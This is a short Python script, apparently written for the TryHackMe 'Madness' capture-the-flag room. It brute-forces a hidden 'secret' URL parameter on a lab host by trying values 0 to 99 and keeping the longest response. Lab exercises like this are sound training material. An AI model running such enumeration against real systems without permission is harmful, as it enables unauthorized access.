# This program was used in the TryHackMe room, Madness, https://tryhackme.com/r/room/madness, and was written by me. 

# At one point during the challenge the user must figure out the secret number to continue looking for the 
# flags. An easy way to complete this part of the challenge is either 1) using an application like Burpsuite, 
# or 2) creating a python script to automate it which is shown below

import requests

url = "http://10.10.226.50/th1s_1s_h1dd3n/?"     # base URL
numbers = list(range(100))                       # generate numbers from 0-99
longest_length = 0                               # set longest length to 0
secret_number = None                             # set secret number to none

for number in numbers:                           # iterate through the numbers and send as payload
    params = {"secret": number}                  # create the parameters for the secret key
    response = requests.get(url, params=params)  # use GET and create the request with the URL and parameters

    print(f"Trying number: {number}")            # print to the terminal what number is being tested

    # check if the response indicates the correct number
    if len(response.text) > longest_length:      # check response length for the longest length
        longest_length = len(response.text)      # if bigger than the longest, set it as the new longest
        secret_number = number                   # set the secret number

if secret_number is not None:                             # check if there is secret number
    print(f"Secret number found: {secret_number}")        # print the found secret number
else: 
    print("Secret number not found in the range 0-99.")   # print that no secret number was found
